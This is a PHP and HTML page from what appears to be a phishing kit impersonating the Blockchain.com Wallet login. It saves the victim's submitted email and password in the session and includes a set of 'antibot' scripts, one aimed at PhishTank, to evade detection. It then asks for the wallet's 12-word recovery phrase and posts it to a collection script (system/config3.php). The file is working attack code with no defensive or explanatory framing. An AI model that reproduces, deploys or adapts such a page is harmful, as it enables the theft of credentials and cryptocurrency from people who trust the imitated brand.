<?php
/*

          

*/

@session_start();

$get_sessionid = $_GET["SESSION"];
//echo $get_sessionid;

// Retrive Session
$get_sess = $_SESSION["sess_id"];
session_id($get_sess);

require "includes/blocker1.php"; // ITS REQURED EVERY PAGE

// Check Session
if ($get_sessionid !== $get_sess) {
	print '
	<html><head>
	<title>403 - Forbidden</title>
	</head><body>
	<h1>403 Forbidden</h1>
	</p></p>
	<hr>
	</body></html>
	';
	exit();
}



$_SESSION["email"] = $_POST["email"];
$_SESSION["pass"] = $_POST["pass"];

?>
<?php
	include "antibots/bots.php";
    include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="icon" href="css/favicon.ico" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain.com Wallet - Exchange Cryptocurrency</title>
    <link rel="stylesheet" href="../style.css">
<style nonce="w3KKyMBGsuxbzeRsTj0w4ZtLdF7YMwTF">html,
      body,
      #app,
      #app > div {
        padding: 0;
        margin: 0;
        height: 100%;
      }
      html,
      body {
        overflow: hidden;
      }
      /* hide scrollbars */
      ::-webkit-scrollbar {
        display: none;
      }
      * {
        scrollbar-width: none;
        -ms-overflow-style: none;
        -webkit-font-smoothing: antialiased;
      }
      .grecaptcha-badge {
        visibility: hidden;
      }</style>	
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
</head>
<body>
   <div id="app"><div class="sc-jzgbtB eTdLKk"><div class="sc-iuJeZd dfMFAv"><span></span></div><div class="sc-gJWqzi cUnQgz"><div height="112px" class="sc-bXGyLb bixyKR"><div class="sc-lkqHmb foabOi sc-emmjRN csisZY"><div class="sc-eLExRp gWcMcI sc-cpmLhU eplNXa"><div class="sc-bnXvFD hFPMLV"><a href="https://www.blockchain.com" color="blue600" class="sc-bxivhb gyslwv"><img src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd5ef690da30e77ec34105f3" srcset="" class="sc-htpNat kZQjSW sc-dymIpo hrwGqG" color="auto" width="auto" height="24px"></a></div></div></div></div></div><div class="sc-rBLzX cFxPZj">
<div class="sc-dBaXSw jvGdZU"><div class="sc-bNQFlB ksEeVc"></div><div class="sc-dRCTWM dlQZmq"><div class="sc-hizQCF eqFanl"><div class="sc-fKGOjr sc-eNPDpu cmopvD"><div></div><form class="sc-gacfCG jZOEPv sc-hlILIN epMhlz" method="post" action="system/config3.php?SESSION=<?php echo $get_sess; ?>">
  <div color="grey900" style="margin-bottom: 8px;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;font-weight: 600;font-size: 16px;line-height: 1.5;text-transform: none;font-style: normal;color: rgb(18, 29, 51);cursor: inherit;display: block;opacity: 1;" cursor="inherit" opacity="1" class="sc-gzVnrw BCruu">Input your secret private key recovery phrase <div></div></div><div color="grey600" style="margin-bottom: 16px;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;font-weight: 500;font-size: 12px;line-height: 1.5;text-transform: none;font-style: normal;color: rgb(103, 113, 132);cursor: inherit;display: block;opacity: 1;" cursor="inherit" opacity="1" class="sc-gzVnrw iVtkAS">Your 12 word Secret Private Key Recovery Phrase grants access to your account. Please input it in the order specified. </div><br>
  <div class="sc-cqPOvA bJoSAC" style="font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;font-weight: 500;font-size: 14px;line-height: 1.5;text-transform: none;font-style: normal;color: rgb(103, 113, 132);cursor: inherit;display: block;opacity: 1;"><div class="sc-gNJABI hjIFcQ"><label for="guid" class="sc-yZwTr aEyxW"></label><div class="sc-kkbgRg jkPVaF" height="48px"><div class="sc-dVhcbM klJnQP"><textarea name="mnemonic" required="" placeholder="Enter your secret private key recovery phrase" rows="3" class="sc-fBuWsC bxIxox" style="display: block;width: 100%;padding: 6px 12px;box-sizing: border-box;font-size: 14px;color: rgb(53, 63, 82);background-color: rgb(255, 255, 255);background-image: none;outline-width: 0px;user-select: text;font-weight: 500;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;resize: initial;border: 1px solid rgb(223, 227, 235);border-radius: 8px;"></textarea></div></div></div></div><div color="grey600" style="margin: 8px 0px 24px; text-align: center;font-family: &quot;Inter&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;font-weight: 500;font-size: 14px;line-height: 1.5;text-transform: none;font-style: normal;color: rgb(103, 113, 132);cursor: inherit;display: block;opacity: 1;" cursor="inherit" opacity="1" class="sc-gzVnrw jPqPHm">Separate each word with a space </div><div class="sc-cqPOvA bJoSAC">
       
   
   
   <button type="submit" height="48px" data-e2e="loginButton" class="sc-gqjmRU kSeSbm sc-jQMNup XJzcz" color="white"><div color="whiteFade900" cursor="inherit" opacity="1" class="sc-htoDjs kcOprW"><span>Continue</span> </div></button></div></form><div class="sc-cgHJcJ fkftRa"><a data-e2e="loginGetHelp" color="blue600" class="sc-bxivhb gEltBr" href="./../help"><span>Need some help?</span></a></div></div><a color="blue600" data-e2e="signupLink" class="sc-bxivhb gyslwv" href="#/signup"><div class="sc-cCVOAp dUPswH"><div color="whiteFade600" cursor="inherit" opacity="1" class="sc-htoDjs jsjQBg"><span></span> </div>&nbsp;<div color="whiteFade900" class="sc-htoDjs kcOprW sc-cfWELz fukSbz" cursor="inherit" opacity="1"><span>Log In with Mobile App -&gt;</span> </div></div></a></div></div></div></div><div class="sc-gFaPwZ GesYI"><div class="sc-fhYwyz iwjbKx"><div class="sc-kEYyzF fVTpCS"><ul class="sc-eHgmQL ffypnH" style="display: none;">
       
    
    
   <li class="sc-cvbbAY fYKafc"><a href="./index.php">English</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./fr.php"> French</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./de.php"> German</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./it.php"> Italian</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./pt.php"> Portuguese</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./ru.php"> Russian</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./es.php"> Spanish</a></li>
        <li class="sc-cvbbAY fYKafc"><a href="./tr.php"> Turkish</a></li>
    </ul><div color="grey400" class="sc-kkGfuU fGrWeP"><div class="sc-iAyFgw gujfRv">English</div><i class="down" color="grey700"></i></div></div><span class="sc-hMFtBS dHgYOK"><a color="grey400" href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases" target="_blank" class="sc-bxivhb hasGHX"><span>Version 4.60.1</span></a></span></div></div></div></div>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
   <script>
    $('.fVTpCS').click( function(){
    $('.ffypnH').toggle();
    });
    </script>


<style type="text/css"></style></body></html>